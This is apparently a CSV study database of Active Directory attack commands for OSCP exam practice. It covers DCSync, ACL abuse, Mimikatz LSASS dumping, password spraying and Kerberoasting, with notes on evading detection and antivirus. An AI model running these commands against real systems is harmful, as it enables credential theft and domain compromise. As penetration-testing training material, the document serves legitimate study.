"id","name","category","command","description","subcategory","notes","oscp_relevance"
"ad-dcsync-check-permissions","Check DCSync Replication Permissions","enumeration","Get-DomainObjectAcl -DistinguishedName 'DC=<DOMAIN>,DC=<TLD>' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID $env:USERNAME))}","Verify if the current user or specified account has the required ACL permissions to perform DCSync attacks (Replicating Directory Changes rights on the domain object).","privilege-enumeration","OSCP METHODOLOGY - DCSYNC PERMISSION VALIDATION:
BEFORE attempting DCSync attacks, VALIDATE permissions to avoid:
1.

**Detection**:
Failed DCSync attempts generate Event ID 4662 (suspicious if repeated)
2.

**Time waste**:
Troubleshooting permission errors during exam wastes precious time
3.

**Account lockout**:
Repeated failures may trigger security alerts or account restrictions

WHEN TO CHECK DCSYNC PERMISSIONS:
1.

**After obtaining Domain Admin**:
   - Verify DA account actually works
   - Confirm no unusual ACL restrictions
   - Validate before proceeding with Golden Ticket workflow

2.

**When enumerating privilege escalation paths**:
   - Identify which accounts can DCSync (besides default DAs)
   - Discover custom delegated permissions (backup operators, etc.)
   - Map attack graph:
User A → DCSync → krbtgt hash → Golden Ticket

3.

**After compromising service account**:
   - Some service accounts have replication rights (backup services, monitoring tools)
   - Verify before attempting DCSync with service account credentials

4.

**During ACL abuse attacks**:
   - If you have WriteDACL on domain object, you can GRANT yourself replication rights
   - Validate after granting rights to confirm success

DEFAULT GROUPS WITH REPLICATION RIGHTS:
BY DEFAULT, these groups have DS-Replication-Get-Changes + DS-Replication-Get-Changes-All:
1.

**Domain Admins** (most common):
   - Default administrative group for domain
   - RID:
512 (S-1-5-21-DOMAIN-DOMAIN-DOMAIN-512)
   - Check membership:
net group ""Domain Admins"" /domain

2.

**Enterprise Admins** (forest-wide):
   - Exists only in forest root domain
   - Has admin rights across ALL domains in forest
   - Check membership:
net group ""Enterprise Admins"" /domain

3.

**Administrators** (built-in):
   - Built-in local administrators group
   - Check membership:
net localgroup Administrators

4.

**Domain Controllers** (computer accounts):
   - All DC machine accounts (DC1$, DC2$, etc.)
   - Used for legitimate DC-to-DC replication

CUSTOM DELEGATED PERMISSIONS (less common but possible):
- **Backup Operators**:
Sometimes granted replication rights for backup software
- **Monitoring accounts**:
SIEM/monitoring tools may need replication access for auditing
- **Specific service accounts**:
Custom delegation for specific business needs

DISCOVER CUSTOM DELEGATIONS:
Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication'} | Select SecurityIdentifier,ObjectAceType | Sort-Object -Unique
# Shows ALL SIDs with replication rights
# Convert SIDs to names:
ConvertFrom-SID <SID>

MANUAL ALTERNATIVE (without PowerView):
USING DSACLS.EXE (Windows built-in):
dsacls.exe ""DC=corp,DC=com"" | findstr /i replication

OUTPUT EXAMPLE:
  Allow CORP\Domain Admins     DS-Replication-Get-Changes
  Allow CORP\Domain Admins     DS-Replication-Get-Changes-All
  Allow CORP\Enterprise Admins DS-Replication-Get-Changes
  Allow CORP\Enterprise Admins DS-Replication-Get-Changes-All

INTERPRETATION:
- 'Allow' = Permission granted (not 'Deny')
- Principal (CORP\Domain Admins) = Who has permission
- Permission name = What they can do

LOOK FOR YOUR USER/GROUPS:
dsacls.exe ""DC=corp,DC=com"" | findstr /i ""jeffadmin\|replication""
# Shows if user 'jeffadmin' has replication rights

USING NATIVE POWERSHELL (no PowerView):
(Get-Acl -Path 'AD:\DC=corp,DC=com').Access | ? {$_.ObjectType -like '*1131f6a*'} | Select IdentityReference,ActiveDirectoryRights
# ObjectType GUID 1131f6a* matches replication permissions
# Output shows IdentityReference (user/group) and their rights

ACL ABUSE - GRANTING DCSYNC PERMISSIONS:
IF YOU HAVE WriteDACL PERMISSION on domain object, you can GRANT replication rights to any user:
# Add DCSync permissions to user 'backupuser' (PowerView):
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=com' -PrincipalIdentity 'backupuser' -Rights DCSync

# ALTERNATIVELY (native PowerShell, more complex):
$user = Get-ADUser backupuser
$acl = Get-Acl -Path 'AD:\DC=corp,DC=com'
$sid = New-Object System.Security.Principal.SecurityIdentifier $user.SID
# Add DS-Replication-Get-Changes
$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid,'ExtendedRight','Allow',([guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2')
# Add DS-Replication-Get-Changes-All
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid,'ExtendedRight','Allow',([guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')
$acl.AddAccessRule($ace1)
$acl.AddAccessRule($ace2)
Set-Acl -Path 'AD:\DC=corp,DC=com' -AclObject $acl

VALIDATE AFTER GRANTING:
Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID 'backupuser'))}
# Should show BOTH permissions now

TIME ESTIMATES FOR OSCP EXAM:
- Check current user permissions:
<10 seconds (if PowerView loaded)
- Check specific user permissions:
<10 seconds
- List ALL principals with replication rights:
<15 seconds
- Grant DCSync permissions (ACL abuse):
<30 seconds
- Validate after granting:
<10 seconds
- TOTAL (permission check before DCSync):
**<30 seconds**

Always validate before attempting DCSync - 30 seconds of checking saves 5-10 minutes of troubleshooting failed attempts.

DETECTION AND OPSEC:
ACL ENUMERATION DETECTION:
- Event ID 4662:
""An operation was performed on an object"" (DS Access)
  - Object Type:
domain object (DC=corp,DC=com)
  - Access mask:
Read ACL
- VOLUME MATTERS:
Single ACL query is normal, 100+ queries in 10 seconds is suspicious
- OPSEC:
Query ACLs during enumeration phase (not immediately before DCSync)

GRANTING REPLICATION RIGHTS DETECTION (if doing ACL abuse):
- Event ID 5136:
""A directory service object was modified""
  - Attribute:
ntSecurityDescriptor (ACL modification)
  - Value:
Added DS-Replication-Get-Changes[All]
- Event ID 4662:
ACL modification on domain object
- HIGH VISIBILITY:
ACL changes on domain root object are HIGH-PRIORITY ALERTS in mature environments
- OPSEC:
Use existing DA/EA account instead of granting rights (cleaner, less detectable)

COMMON OSCP EXAM SCENARIO:
1.

COMPROMISE DOMAIN USER:
   impacket-GetNPUsers corp.com/ -dc-ip 192.168.50.70 -request
   # AS-REP roast, obtain user 'pete' hash

2.

CRACK HASH:
   hashcat -m 18200 pete_hash.txt rockyou.txt
   # Plaintext:
Password123

3.

VALIDATE PERMISSIONS:
   crackmapexec smb 192.168.50.70 -u pete -p Password123 --groups
   # Output:
pete is NOT in Domain Admins (no DCSync capability)

4.

LATERAL MOVEMENT (find DA):
   crackmapexec smb 192.168.50.0/24 -u pete -p Password123 --local-auth --sam
   # Dump SAM on multiple machines, find cached DA credentials

5.

OBTAIN DA CREDENTIALS:
   # Found:
administrator:2892d26cdf84d7a70e2eb3b9f05c425e (NTLM hash)

6.

VALIDATE DA CAN DCSYNC:
   crackmapexec smb 192.168.50.70 -u administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e --groups
   # Output:
administrator is in Domain Admins ✓

7.

DCSYNC KRBTGT:
   impacket-secretsdump -just-dc-user krbtgt -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/administrator@192.168.50.70
   # Success:
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
8.

GOLDEN TICKET:
   # Use krbtgt hash for persistent access

The permission validation (step 6) confirms DA status BEFORE attempting DCSync, avoiding failed attempts and detection.

FINAL OSCP EXAM TIPS:
1.

**Always check permissions first**:
30 seconds of validation saves 10 minutes of troubleshooting
2.

**Verify group membership**:
whoami /groups OR crackmapexec --groups
3.

**Know default groups**:
Domain Admins = DCSync capability (no need to check ACLs)
4.

**Custom permissions are rare**:
In OSCP labs, DA/EA are the typical DCSync accounts
5.

**If check fails**:
Verify PowerView is loaded, check DN format, ensure network connectivity
6.

**Document findings**:
Create notes:
""User X can DCSync:
YES/NO""

PRACTICE EXERCISES:
1.

Load PowerView and run permission check on lab domain
2.

Check permissions for your user, Domain Admins group, and Enterprise Admins
3.

List ALL principals with replication rights (remove user filter)
4.

Practice converting SIDs to usernames (ConvertFrom-SID)
5.

Compare PowerView results with dsacls.exe output (verify consistency)
6.

Time yourself:
From PowerShell launch to permission check complete (<30 seconds target)","medium"
"ad-dcsync-check-domain-admins","Verify Domain Admin Membership","enumeration","net group ""Domain Admins"" /domain","List all members of the Domain Admins group to verify current user has required privileges for DCSync. Domain Admins have replication rights by default.","active-directory","ALWAYS verify Domain Admin membership BEFORE attempting DCSync. This saves time and avoids failed attack attempts that may generate alerts. If your user is NOT a Domain Admin, check for explicit replication rights assignment (rare but possible). Alternative high-privilege groups: Enterprise Admins (cross-forest), Administrators (domain-wide), Domain Controllers (computer accounts). Time estimate: <5 seconds.

MANUAL ALTERNATIVES:
PowerShell:
Get-ADGroupMember -Identity ""Domain Admins"" | Select Name, SamAccountName
Get-ADUser <USERNAME> -Properties MemberOf | Select -ExpandProperty MemberOf

Verify YOUR membership:
whoami /groups | findstr ""Domain Admins""
net user <USERNAME> /domain | findstr ""Domain Admins""

Impacket (Linux):
lookupsid.py <DOMAIN>/<USER>:<PASS>@<DC_IP>

TIME ESTIMATE: <5 seconds","high"
"ad-dcsync-check-user-groups","Check Current User's Group Memberships","enumeration","whoami /groups","Display all group memberships for the current user to verify Domain Admin or replication privileges. Native Windows command, no additional tools required.","active-directory","Fastest method to verify your OWN privileges without querying the domain controller. The security token contains all group memberships assigned at logon time. CRITICAL: Token is created at logon - if permissions changed after you logged in, whoami won't reflect new groups until you re-authenticate. For most current state, use 'net user <USERNAME> /domain' to query DC directly. Time estimate: Instant (<1 second).

MANUAL ALTERNATIVES:
Check specific group:
whoami /groups | findstr /I ""Domain Admins""
whoami /groups | findstr /I ""S-1-5-21-.*-512""

PowerShell:
[Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([Security.Principal.NTAccount]) }

Verify privileges (alternative indicator):
whoami /priv | findstr SeBackupPrivilege
whoami /priv | findstr SeRestorePrivilege

Linux (after obtaining TGT):
klist
rpcclient -U <DOMAIN>/<USER>%<PASS> <DC_IP> -c 'getusername'

TIME ESTIMATE: <1 second","high"
"ad-dcsync-check-replication-rights","Verify Replication Rights (Advanced)","enumeration","powershell -c ""(Get-Acl 'AD:\<DOMAIN_DN>').Access | Where-Object {$_.IdentityReference -eq '<DOMAIN>\<USERNAME>' -and ($_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')} | Select IdentityReference, ActiveDirectoryRights, ObjectType""","Check for explicit replication rights assignment on domain object. Required only if user is NOT Domain Admin but may have custom replication permissions assigned.","active-directory","This check is RARELY needed in OSCP - most DCSync scenarios involve compromised Domain Admin accounts. Use this only if: (1) You have domain user creds but not DA, (2) Suspicious user has DCSync capability (red team defense evasion), (3) Investigating custom permission delegation. In real penetration tests, attackers occasionally find service accounts or helpdesk accounts with these rights assigned for legitimate backup purposes. Time estimate: 5-10 seconds.

MANUAL ALTERNATIVES:
Without PowerShell (dsacls.exe):
dsacls ""<DOMAIN_DN>"" | findstr /I ""<USERNAME>""
dsacls ""<DOMAIN_DN>"" | findstr /I ""1131f6aa-9c07-11d1-f79f-00c04fc2dcd2""

Query specific user:
Get-ADUser <USERNAME> -Properties * | Select Name, MemberOf, msDS-AllowedToDelegateTo

BloodHound (automated):
Find users with DCSync rights: MATCH (n:User)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name

Impacket (Linux):
python3 dacledit.py -action read -principal <USERNAME> -target ""<DOMAIN_DN>"" '<DOMAIN>/<USER>:<PASS>'

TIME ESTIMATE: 10-15 seconds (including RSAT module import)","medium"
"mimikatz-sekurlsa-logonpasswords","Mimikatz Extract Logon Passwords","post-exploit",".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""","Extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory. Primary method for credential harvesting on compromised Windows systems. Requires local administrator privileges.","credential-harvesting","OSCP METHODOLOGY: Credential harvesting is MANDATORY on every compromised system with admin access. Service sessions are goldmines - Domain Admins often run scheduled tasks on workstations, caching credentials accessible to local admins. PATTERN: Local admin on ANY workstation = potential DA credential harvest.

TIME ESTIMATE: 2-5 minutes (1 min upload, 1 min execute, 1-3 min parse output)

MANUAL ALTERNATIVES:
1. LSASS dump: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\temp\lsass.dmp full
2. Parse offline: pypykatz lsa minidump lsass.dmp (on Kali)
3. Procdump: procdump64.exe -ma lsass.exe lsass.dmp

OUTPUT ANALYSIS:
- Session types: Interactive = RDP/console login, Service = scheduled task/service, RemoteInteractive = RDP
- Domain field: Filter for target domain (ignore NT AUTHORITY\SYSTEM, MicrosoftAccount\, etc.)
- NTLM hash format: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c (LM:NTLM)
- Use NTLM directly for Pass-the-Hash (no cracking needed)

EXAM TIPS:
- Save output to file: mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" > creds.txt
- Use Evil-WinRM download to retrieve: download creds.txt
- Document ALL credentials immediately (usernames, domains, hashes, passwords)
- Test Pass-the-Hash before attempting password cracking (saves hours)","high"
"mimikatz-sekurlsa-tickets-export","Mimikatz Export Kerberos Tickets","post-exploit",".\mimikatz.exe ""privilege::debug"" ""sekurlsa::tickets /export"" ""exit""","Export all Kerberos tickets (TGT and TGS) from LSASS memory to .kirbi files. Enables Pass-the-Ticket attacks and ticket manipulation. Alternative to password/hash-based authentication.","credential-harvesting","OSCP RELEVANCE: Pass-the-Ticket is less common in OSCP than Pass-the-Hash, but valuable when NTLM is disabled or for specific scenarios (e.g., reusing admin tickets).

TIME ESTIMATE: 3-5 minutes (1 min execute, 1 min download tickets, 1-3 min ticket analysis)

USING EXPORTED TICKETS:
1. WINDOWS: mimikatz.exe 'kerberos::ptt [0;3e7]-2-0-40e10000-admin@krbtgt-CORP.COM.kirbi' (inject into current session)
2. LINUX: impacket-ticketConverter [0;3e7]-2-0-40e10000-admin@krbtgt-CORP.COM.kirbi admin.ccache, then export KRB5CCNAME=admin.ccache
3. VERIFY: klist (Windows) or klist -c admin.ccache (Linux)

TICKET ANALYSIS:
- TGT (Type 2): Can request tickets for ANY service (most valuable)
- TGS (Type 0): Single service only (e.g., cifs/DC1 for SMB, http/WEBSERVER for HTTP)
- Look for: DA tickets, service account tickets, high-privilege user tickets

ALTERNATIVES:
- Rubeus.exe dump /service:krbtgt (modern C# alternative to Mimikatz)
- Rubeus.exe triage (list tickets without exporting)
- Invoke-Mimikatz -Command '""sekurlsa::tickets /export""' (PowerShell)

EXAM TIP: If you find TGT for Domain Admin, use it! Pass-the-Ticket can bypass some detection that catches Pass-the-Hash.","medium"
"mimikatz-privilege-debug","Mimikatz Enable Debug Privilege","utilities",".\mimikatz.exe ""privilege::debug"" ""exit""","Enable SeDebugPrivilege for current process. Prerequisite for LSASS memory access. Test command to verify Mimikatz will work before running credential extraction.","privilege-escalation","OSCP TIP: Always test 'privilege::debug' FIRST before attempting credential extraction. If this fails, you don't have proper admin rights - troubleshoot before running sekurlsa commands.

TIME ESTIMATE: 10 seconds

DEBUG WORKFLOW:
1. Verify local admin: whoami /groups | findstr Administrators
2. Test privilege: .\mimikatz.exe ""privilege::debug"" ""exit""
3. If success: Proceed with sekurlsa::logonpasswords
4. If failure: Troubleshoot admin rights

ALTERNATIVE CHECK:
- Windows: whoami /priv | findstr SeDebugPrivilege (should show 'Disabled' for admin)
- PowerShell: [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)","high"
"crackmapexec-validate-admin","CrackMapExec - Validate Credentials and Admin Rights","enumeration","crackmapexec smb <TARGET> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN>","Validate domain credentials and check for local administrator privileges on target systems.
Pwn3d! indicator shows which systems grant local admin access.","active-directory","CRITICAL OSCP skill:
Validate credentials and identify local admin rights in one command.

PWND INDICATOR:
Pwn3d! means user has LOCAL ADMINISTRATOR privileges on the target system = full system compromise possible.

Output examples:
[+] corp.com\dave:Flowers1 = Valid credentials but NOT admin.

[+] corp.com\dave:Flowers1 (Pwn3d!) = Valid credentials AND local admin.

WHY THIS WORKS:
CrackMapExec authenticates via SMB and attempts to access ADMIN$ share or perform privileged operations.

If successful, user is local admin.

NOISE LEVEL:
Low for single validation check.

TIME ESTIMATE:
2-5 seconds per host.

SUBNET SCANNING:
Use CIDR notation to find systems where user is admin:
crackmapexec smb 192.168.50.0/24 -u dave -p 'Flowers1' -d corp.com.

This scans entire subnet and shows which systems display Pwn3d! OSCP TIP:
After password spraying, immediately validate found credentials to identify admin access.

Local admin on one workstation can lead to lateral movement and domain admin compromise.

BONUS:
Add --shares flag to see accessible shares, --sam to dump local password hashes (requires Pwn3d!), --lsa to dump cached domain credentials (requires Pwn3d!).

Example full validation:
crackmapexec smb <TARGET> -u <USER> -p '<PASS>' -d <DOMAIN> --shares --sam --lsa","high"
"kerbrute-validate-creds","Kerbrute - Quick Credential Validation","enumeration","kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERFILE> '<PASSWORD>'","Rapidly validate domain credentials via Kerberos pre-authentication.
No full login required - minimal network footprint with just 2 UDP packets.","active-directory","FASTEST way to validate domain credentials without full authentication.

Uses Kerberos AS-REQ to test if credentials are valid.

ONLY 2 UDP PACKETS - stealthier than SMB/RDP login attempts.

NOISE LEVEL:
Minimal - only generates Event ID 4768 (TGT request) for valid creds or Event ID 4771 (pre-auth failed) for invalid.

SPEED:
<1 second for single validation.

LIMITATION:
Only validates credentials are correct, does NOT check admin rights (use crackmapexec-validate-admin for that).

WHY THIS WORKS:
Kerberos pre-authentication requires encrypted timestamp using user's password hash.

If credentials valid, KDC issues TGT.

If invalid, KDC returns pre-auth error.

TIME ESTIMATE:
<5 seconds.

USE CASES:
(1) Quick validation of credentials found during engagement.

(2) Batch validation of multiple username:password pairs.

(3) Pre-check before attempting noisy SMB/RDP login.

OSCP TIP:
Use this for QUICK validation (""are these creds valid?""), then use crackmapexec-validate-admin to check if user is local admin somewhere.

Kerbrute doesn't show admin rights, only credential validity.

For single user validation, create file:
echo 'pete' > user.txt && kerbrute passwordspray -d corp.com --dc 192.168.50.70 user.txt 'Nexus123!'","high"
"impacket-getuserspns-kerberoast","impacket-GetUserSPNs - Kerberoasting Attack","password-attacks","sudo impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>","Request and extract TGS-REP hashes for service accounts (Kerberoasting)","active-directory","KERBEROASTING extracts TGS-REP hashes from service accounts.

WHY THIS WORKS:
Any authenticated domain user can request TGS (service ticket) for ANY SPN in the domain.

The TGS is encrypted with the service account's password hash.

No permission checks at TGS request time - checks only happen when accessing the actual service.

This allows offline hash cracking.

TARGET ACCOUNTS:
Service accounts with SPNs (SQL Server, IIS, custom services).

CRITICAL DISTINCTION:
Computer accounts (MACHINE$) and Managed Service Accounts (MSAs) use 120-character random passwords - effectively uncrackable.

Focus on USER accounts with SPNs (iis_service, sql_service, etc.).

HASH FORMAT:
Output is $krb5tgs$23$ (Kerberos 5 TGS-REP etype 23 = RC4-HMAC).

Use Hashcat mode 13100.

RC4 VS AES:
Accounts with 'msDS-SupportedEncryptionTypes' attribute set to AES will return AES-encrypted tickets (harder to crack).

Use Rubeus with /tgtdeleg flag to force RC4 (see rubeus-kerberoast-aes).

OSCP TIP:
Kerberoasting is HIGH-PRIORITY attack - fast to execute (30 seconds), often successful (weak service account passwords common), and requires only domain user credentials.

TIME ESTIMATE:
10-30 seconds for hash extraction + 1-120 minutes for cracking (depends on password).

DETECTION:
Event ID 4769 (TGS request) - normal Kerberos traffic, difficult to distinguish from legitimate service access.

STEALTH:
Very low detection risk.

OUTPUT ANALYSIS:
Look for accounts in privileged groups (memberof column).

Service accounts are often over-privileged (Domain Admins, local admins on multiple systems).

Clock sync is CRITICAL - use ntpdate or rdate if KRB_AP_ERR_SKEW errors occur.","high"
"impacket-getuserspns-list","impacket-GetUserSPNs - List SPNs Only","enumeration","sudo impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USERNAME>","Enumerate service principal names without requesting TGS tickets","active-directory","SPN ENUMERATION ONLY - lists service accounts without extracting hashes.

Use this for:
(1) Reconnaissance before Kerberoasting.

(2) Identifying high-value targets.

(3) Checking if Kerberoasting is viable.

OUTPUT COLUMNS:
ServicePrincipalName (service type and hostname), Name (account name), MemberOf (group membership - look for admin groups), PasswordLastSet (old = weak password likely), LastLogon (active account check).

SPN FORMAT:
protocol/hostname:port (e.g., HTTP/web04.corp.com:80, MSSQLSvc/sql01.corp.com:1433).

TARGET SELECTION:
Prioritize accounts with:
(1) Old PasswordLastSet dates (>1 year = weak password likely).

(2) Privileged group membership (Domain Admins, Enterprise Admins).

(3) Generic service names (sql_service, iis_service often have weak passwords like 'Password1!').

COMPUTER ACCOUNTS:
Ignore SPNs registered to computer accounts (ending in $) - these have 120-character random passwords.

OSCP STRATEGY:
Run enumeration FIRST to identify targets, then use -request flag for hash extraction.

TIME ESTIMATE:
<5 seconds.

NO HASH EXTRACTION:
Add -request flag to extract TGS-REP hashes (see impacket-getuserspns-kerberoast).

DETECTION:
Minimal - standard LDAP queries for SPN attribute, Event ID 4662 (directory service access).","high"
"rubeus-kerberoast","Rubeus - Kerberoasting (Windows)","password-attacks",".\Rubeus.exe kerberoast /outfile:<OUTPUT_FILE>","Extract TGS-REP hashes from Windows using Rubeus","active-directory","WINDOWS-BASED KERBEROASTING using Rubeus.exe.

ADVANTAGES OVER IMPACKET:
(1) No credentials needed (uses current user context).

(2) Faster from Windows (native Kerberos API).

(3) No time sync issues.

(4) Auto-discovers SPNs.

EXECUTION CONTEXT:
Run from domain-joined Windows system OR use runas /netonly.

TOOL LOCATION:
C:\Tools\Rubeus.exe on OSCP lab systems.

Download:
https://github.com/GhostPack/Rubeus.

HASH OUTPUT:
Hashcat mode 13100 compatible by default.

AES VS RC4:
Modern domains return AES-encrypted tickets (Supported ETypes:
RC4_HMAC_DEFAULT vs AES256_CTS_HMAC_SHA1_96).

AES is stronger and slower to crack.

Use /tgtdeleg flag to force RC4 downgrade (see rubeus-kerberoast-aes).

OSCP TIP:
Rubeus preferred when you have RDP/WinRM access to Windows.

No credentials needed, no time sync.

OUTPUT ANALYSIS:
Look for 'Supported ETypes:
RC4_HMAC_DEFAULT' (easier to crack) vs AES (harder).

Target RC4 accounts first.

TIME ESTIMATE:
10-30 seconds for hash extraction.

AV EVASION:
Rubeus flagged by Windows Defender.

Options:
(1) Disable AV.

(2) Obfuscated version.

(3) Reflective loading.

(4) Fall back to impacket from Linux.

MULTIPLE ACCOUNTS:
Rubeus automatically finds ALL SPNs linked to user accounts and extracts hashes sequentially.

Hash saved to /outfile path specified.

DETECTION:
Event ID 4769 (TGS request) - normal Kerberos traffic, low visibility.","high"
"rubeus-kerberoast-aes","Rubeus - Kerberoasting with RC4 Downgrade","password-attacks",".\Rubeus.exe kerberoast /tgtdeleg /outfile:<OUTPUT_FILE>","Force RC4 encryption for AES-enabled accounts using TGT delegation","active-directory","RC4 DOWNGRADE TECHNIQUE for accounts configured to use AES encryption.

WHY THIS MATTERS:
AES-encrypted TGS tickets are SLOWER to crack than RC4 (10-100x slower depending on hardware).

Modern domains default to AES for stronger security.

RC4 is legacy but still supported for backward compatibility.

/tgtdeleg MECHANISM:
Requests TGT with constrained delegation flag, then uses that TGT to request TGS.

The delegation TGT forces RC4 encryption regardless of account's encryption type setting.

WHEN TO USE:
(1) Rubeus kerberoast shows 'Supported ETypes:
AES256_CTS_HMAC_SHA1_96'.

(2) You have limited time for cracking (OSCP exam).

(3) Weak password suspected (worth trying faster cracking method).

OSCP TIP:
Try /tgtdeleg FIRST to get RC4 hashes.

If it fails, fall back to standard kerberoasting with AES hashes.

TIME SAVINGS:
RC4 cracking is ~10x faster than AES.

Example:
rockyou.txt with rules takes 3 hours for RC4 vs 30+ hours for AES.

DETECTION:
Same as standard Kerberoasting - Event ID 4769 (TGS request).

TGT delegation adds Event ID 4768 (TGT request) but still normal Kerberos traffic.

HASH FORMAT:
Output is still Hashcat mode 13100 ($krb5tgs$23$ = etype 23 = RC4-HMAC).

AES would be mode 19600/19700.

LIMITATIONS:
Some hardened domains disable RC4 entirely (enforce AES-only).

In this case, /tgtdeleg will fail and you must crack AES hashes.

NOT ALWAYS NEEDED:
Check 'Supported ETypes' in standard Rubeus output.

If already RC4_HMAC_DEFAULT, no need for /tgtdeleg.","medium"
"powerview-kerberoast","PowerView - Invoke-Kerberoast","password-attacks","Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash","Kerberoasting using PowerView PowerShell module","active-directory","POWERVIEW-BASED KERBEROASTING.

ADVANTAGES:
(1) Pure PowerShell (no exe upload).

(2) Integrated with PowerView enumeration.

(3) Flexible output formats.

DISADVANTAGES:
(1) Slower than Rubeus.

(2) PowerView often flagged by AV.

(3) Requires PowerView import.

POWERVIEW LOCATION:
C:\Tools\PowerView.ps1 on lab systems OR download from PowerSploit.

IMPORT:
Import-Module .\PowerView.ps1 OR dot-source:
.

.\PowerView.ps1.

EXECUTION POLICY:
May need bypass:
powershell -ep bypass -c 'Import-Module .\PowerView.ps1; Invoke-Kerberoast -OutputFormat Hashcat'.

OUTPUT:
Default shows SamAccountName, ServicePrincipalName, Hash.

Use Select-Object -ExpandProperty Hash for hash-only output.

OSCP TIP:
Rubeus is generally preferred (faster, cleaner output).

Use PowerView when:
(1) Rubeus blocked by AV.

(2) Already using PowerView for other enumeration.

(3) Need PowerShell-only solution.

SAVE TO FILE:
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File hashes.txt.

TIME ESTIMATE:
30-60 seconds for hash extraction (slower than Rubeus).

DETECTION:
Event ID 4769 (TGS request) - normal Kerberos traffic.

PowerView import may trigger Event ID 4104 (PowerShell script block logging) if enabled.

ALTERNATIVE SYNTAX:
Get-DomainSPNTicket (older PowerView cmdlet, same functionality).","medium"
"setspn-list-user-spns","setspn - List Service Principal Names","enumeration","setspn -Q */*","Enumerate SPNs using Windows built-in setspn.exe","active-directory","BUILT-IN SPN ENUMERATION using setspn.exe (no tools needed).

ADVANTAGES:
(1) Built into Windows (no upload).

(2) Legitimate admin tool (low suspicion).

(3) No AV flags.

(4) Works on very old Windows versions.

DISADVANTAGES:
(1) Shows ALL SPNs (computer + user accounts - requires manual filtering).

(2) No automatic hash extraction.

(3) Verbose output.

OUTPUT FORMAT:
Shows CN= (common name), servicePrincipalName, and DN (distinguished name).

FILTERING USER ACCOUNTS:
Look for CN= lines without $ (computer accounts end in $).

Example:
CN=iis_service vs CN=WEB01$ (computer).

COMMON SPN TYPES:
HTTP/ (web servers, IIS), MSSQLSvc/ (SQL Server), WSMAN/ (WinRM), HOST/ (multiple services), TERMSRV/ (RDP), RestrictedKrbHost/ (Kerberos-constrained delegation).

OSCP TIP:
Use setspn for initial reconnaissance when Rubeus/impacket unavailable.

Note user account SPNs, then use Rubeus/impacket for hash extraction.

MANUAL FILTERING:
setspn -Q */* | findstr /V '$' | findstr 'CN=' (remove computer accounts, show only CN lines).

TIME ESTIMATE:
5-15 seconds depending on domain size.

DETECTION:
Legitimate admin activity - Event ID 4662 (directory service access).

Very low suspicion.

ALTERNATIVE:
setspn -T corp.com -Q */* (specify domain explicitly).","medium"
